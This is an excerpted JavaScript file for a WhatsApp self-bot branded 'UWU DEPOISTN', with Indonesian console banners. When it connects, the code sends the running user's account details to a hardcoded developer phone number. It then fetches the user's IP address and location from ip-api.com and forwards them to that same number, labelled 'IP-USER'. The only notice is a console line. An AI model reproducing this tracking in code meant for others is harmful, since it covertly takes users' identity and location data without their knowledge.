...
const starts = async (client = new WAConnection()) => {
  ...
  client.browserDescription = ["Rizky Sad", "Chrome", "3.0"];
  ...
  client.on("qr", () => {
    console.log(
      ...
      color("]", "white"),
      color(" Scan bang"),
      client.sendMessage(`6282233486524@s.whatsapp.net`, `「 *NOTIFICATION!* 」\n\n _Bot Berhasil Terhubung!_`, MessageType.extendedText)
...
console.log(color(figlet.textSync(`${spc1}            𝙐𝙒𝙐 𝘿𝙀𝙋𝙊𝙄𝙎𝙏𝙉`, {
font: 'Standard',
...
console.log(color(`${spc4}< ================================================== >`, 'cyan'))
    ...
    console.log(color('⎇','red'), color('𝗦𝗰𝗿𝗶𝗽𝘁 𝗜𝗻𝗶 𝗚𝘄 𝗦𝘂𝘀𝘂𝗻 𝗦𝗲𝗻𝗱𝗶𝗿𝗶!\n𝗡𝗼𝘁𝗲: 𝗝𝗮𝗻𝗴𝗮𝗻 𝗟𝘂𝗽𝗮 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗯𝗲 𝙐𝙒𝙐 𝘿𝙀𝙋𝙊𝙄𝙎𝙏𝙉 シ︎', 'yellow'))
    console.log(color('⎇','red'), color('𝗦𝗼𝘂𝗿𝗰𝗲 𝗖𝗼𝗱𝗲 𝗩𝗲𝗿𝘀𝗶𝗼𝗻:', 'aqua'), color(version))
    console.log(color('⎇','red'), color('𝗕𝘂𝗴? 𝗘𝗿𝗿𝗼𝗿? 𝗦𝘂𝗴𝗴𝗲𝘀𝘁𝗶𝗼𝗻? 𝗩𝗶𝘀𝗶𝘁 𝗛𝗲𝗿𝗲:', 'aqua'), color('https://wa.me/6282233486524'))
    console.log(color('[𝙐𝙒𝙐 𝘿𝙀𝙋𝙊𝙄𝙎𝙏𝙉]'), color('𝗦𝗲𝗹𝗳𝗯𝗼𝘁 Rizky 𝙎𝙩𝙮𝙡𝙚 𝗜𝘀 𝗢𝗻𝗹𝗶𝗻𝗲 ㋛︎', 'aqua'))
...
await client.connect({ timeoutMs: 30 * 1000 });
 ...
 client.sendMessage(`6282233486524@s.whatsapp.net`, `*Hai Owner 𝙐𝙒𝙐 𝘿𝙀𝙋𝙊𝙄𝙎𝙏𝙉l, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer 𝙐𝙒𝙐 𝘿𝙀𝙋𝙊𝙄𝙎𝙏𝙉",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./itsmevall.jpg'),sourceUrl:"https://wa.me/6282233486524?text=Assalamualaikum"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       client.sendMessage("6282233486524@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer 𝙐𝙒𝙐 𝘿𝙀𝙋𝙊𝙄𝙎𝙏𝙉",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./itsmevall.jpg'),sourceUrl:"https://wa.me/6282233486524?text=Assalamualaikum"}}})
...
fkontakk = { key: {
 ...
 message: {
    "contactMessage":{"displayName":'Rizkyシ︎⁩',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;𝙐𝙒𝙐 𝘿𝙀𝙋𝙊𝙄𝙎𝙏𝙉 Style;;;\nFN:resku\nitem1.TEL;waid=6282233486524:+62 831-6238-8082\nitem1.X-ABLabel:Mobile\nEND:VCARD"
 }}}
